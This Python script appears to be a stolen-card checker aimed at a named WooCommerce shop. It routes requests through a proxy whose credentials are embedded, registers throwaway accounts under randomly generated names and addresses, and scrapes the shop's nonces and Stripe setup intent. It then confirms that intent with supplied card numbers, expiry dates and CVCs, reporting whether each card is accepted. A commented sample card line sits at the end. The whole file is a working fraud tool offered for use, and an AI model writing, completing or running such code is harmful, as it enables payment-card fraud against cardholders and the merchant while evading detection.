import random
import string
import requests
from user_agent import generate_user_agent
from proxy import reqproxy, make_request
import json
import re

#============================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

#============================================
def Tele(ccx):
    proxy_str = "brd.superproxy.io:33335:brd-customer-hl_5c664e64-zone-datacenter_proxy1:0bnfn02i83lj"
    session, ip = reqproxy(proxy_str)
    #print(f"IP Address: {ip}")
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    #elif "01" in mm or "02" in mm or "01" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
        #mm = mm.split("0")[1]

    user = generate_user_agent()
    r = requests.Session()
    r.verify = False
    
    first_name, last_name = generate_full_name()
    kaddress, city, country, postcode, phone =     generate_address()
    kaddress, city, country, postcode, phone = generate_address()
    email = generate_email()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    nr = random.randint(100000, 999999)
    lr = random.randint(1000, 9999)

    cookies = {
        '_fbp': 'fb.1.1778504058068.608046779714101930',
        'wpdiscuz_nonce_129af3da7b5f92d444045647d47cc943': '12879c98b0',
    }
    
    headers = {
        'authority': 'www.absolutelyspectacolar.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        # 'cookie': '_fbp=fb.1.1778504058068.608046779714101930; wpdiscuz_nonce_129af3da7b5f92d444045647d47cc943=12879c98b0',
        'referer': 'https://www.absolutelyspectacolar.com/customer-service/my-account/payment-methods/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    response = session.get(
        'https://www.absolutelyspectacolar.com/customer-service/my-account/add-payment-method/',
        #cookies=cookies,
        headers=headers,
    )
    
    register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
    print(register)
    
    cookies = {
        '_fbp': 'fb.1.1778504058068.608046779714101930',
        'wpdiscuz_nonce_129af3da7b5f92d444045647d47cc943': '12879c98b0',
        '_ga_T1SM3MZJK5': 'GS2.1.s1778504066$o1$g0$t1778504066$j60$l0$h0',
        '_ga': 'GA1.1.170578875.1778504067',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-11%2012%3A54%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fpayment-methods%2F',
        'sbjs_first_add': 'fd%3D2026-05-11%2012%3A54%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fpayment-methods%2F',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
        'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F',
        'seopress-user-consent-accept': '1',
    }
    
    headers = {
        'authority': 'www.absolutelyspectacolar.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': '_fbp=fb.1.1778504058068.608046779714101930; wpdiscuz_nonce_129af3da7b5f92d444045647d47cc943=12879c98b0; _ga_T1SM3MZJK5=GS2.1.s1778504066$o1$g0$t1778504066$j60$l0$h0; _ga=GA1.1.170578875.1778504067; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-05-11%2012%3A54%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2026-05-11%2012%3A54%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F; seopress-user-consent-accept=1',
        'origin': 'https://www.absolutelyspectacolar.com',
        'referer': 'https://www.absolutelyspectacolar.com/customer-service/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'username': f'Rodamuser{nr}',
        'email': f'rodamuser{nr}@gmail.com',
        'password': 'Gloosmoke@123',
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': 'https://www.absolutelyspectacolar.com/customer-service/my-account/payment-methods/',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://www.absolutelyspectacolar.com/customer-service/my-account/add-payment-method/',
        'wc_order_attribution_session_start_time': '2026-05-11 12:54:27',
        'wc_order_attribution_session_pages': '1',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'woocommerce-register-nonce': f'{register}',
        '_wp_http_referer': '/customer-service/my-account/add-payment-method/',
        'register': 'Register',
    }
    
    response = session.post(
        'https://www.absolutelyspectacolar.com/customer-service/my-account/add-payment-method/',
        #cookies=cookies,
        headers=headers,
        data=data,
    )
    
    ajax = re.search(r'"nonce_wp_rest":"(.*?)"', response.text).group(1)
    print(ajax)
    
    cookies = {
        '_ga': 'GA1.1.1730825564.1778504608',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-11%2013%3A03%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fpayment-methods%2F',
        'sbjs_first_add': 'fd%3D2026-05-11%2013%3A03%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fpayment-methods%2F',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
        'seopress-user-consent-accept': '1',
        '_fbp': 'fb.1.1778504611661.771746268727150521',
        'wordpress_logged_in_129af3da7b5f92d444045647d47cc943': 'Rodamuser03%7C1779714253%7CHbTYYXrdj4yp5d5aEleuqchqyDX8coqymNghbViuHuR%7C2cb4de025797b7e969887b9963a2ba53b28062babbee7a64506218c1c960ecf4',
        'wpdiscuz_nonce_129af3da7b5f92d444045647d47cc943': 'ab14ec5c80',
        '_ga_T1SM3MZJK5': 'GS2.1.s1778504607$o1$g1$t1778504655$j12$l0$h0',
        'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F',
    }
    
    headers = {
        'authority': 'www.absolutelyspectacolar.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_ga=GA1.1.1730825564.1778504608; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-05-11%2013%3A03%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2026-05-11%2013%3A03%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; seopress-user-consent-accept=1; _fbp=fb.1.1778504611661.771746268727150521; wordpress_logged_in_129af3da7b5f92d444045647d47cc943=Rodamuser03%7C1779714253%7CHbTYYXrdj4yp5d5aEleuqchqyDX8coqymNghbViuHuR%7C2cb4de025797b7e969887b9963a2ba53b28062babbee7a64506218c1c960ecf4; wpdiscuz_nonce_129af3da7b5f92d444045647d47cc943=ab14ec5c80; _ga_T1SM3MZJK5=GS2.1.s1778504607$o1$g1$t1778504655$j12$l0$h0; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F',
        'origin': 'https://www.absolutelyspectacolar.com',
        'referer': 'https://www.absolutelyspectacolar.com/customer-service/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'payment_method': 'stripe_cc',
        '_wpnonce': f'{ajax}',
    }
    
    response = session.post(
        'https://www.absolutelyspectacolar.com/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent',
        #cookies=cookies,
        headers=headers,
        data=data,
    )
    
    seti = re.search(r'"id":"(.*?)"', response.text).group(1)
    scrt = re.search(r'"client_secret":"(.*?)"', response.text).group(1)
    print(seti)
    print(scrt)
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    data = f'payment_method_data[type]=card&payment_method_data[billing_details][address][postal_code]=10002&payment_method_data[card][number]={n}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_month]={mm}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]=3061c4fa-b194-4250-9fd1-9445b4e28e75d3693c&payment_method_data[muid]=d8e489e8-875d-4013-93f6-34f59f51ac0b008cbd&payment_method_data[sid]=6524cf56-06f3-4bce-ac6f-8ad7fba7e4d735937f&payment_method_data[payment_user_agent]=stripe.js%2Fc891fde8fc%3B+stripe-js-v3%2Fc891fde8fc%3B+split-card-element&payment_method_data[referrer]=https%3A%2F%2Fwww.absolutelyspectacolar.com&payment_method_data[time_on_page]=113450&payment_method_data[client_attribution_metadata][client_session_id]=5d900189-f0d2-413f-986a-1fd2902202d7&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=split-card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&payment_method_data[client_attribution_metadata][wallet_config_id]=ec46131c-af09-450b-8337-ded7960d0d63&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51L2p6RLp1x9wo94murnx4U0OySL92vosBDnOlzEjQJtd5zbxSlikGl9uEMTNddUfA82tfiURd5rwPXuDC16zwsEQ00Hxmthid3&_stripe_account=acct_1L2p6RLp1x9wo94m&_stripe_version=2022-08-01&client_attribution_metadata[client_session_id]=5d900189-f0d2-413f-986a-1fd2902202d7&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=ec46131c-af09-450b-8337-ded7960d0d63&client_secret={scrt}'
    
    response = requests.post(
        f'https://api.stripe.com/v1/setup_intents/{seti}/confirm',
        headers=headers,
        data=data,
    )
    
    try:
        result = re.search(r'"message":"(.*?)"', response.text).group(1)
    except:
        result = re.search(r'"status":"(.*?)"', response.text).group(1)

    return result
    
#test_card = "5488093801213161|10|28|945"
#print(Tele(test_card))
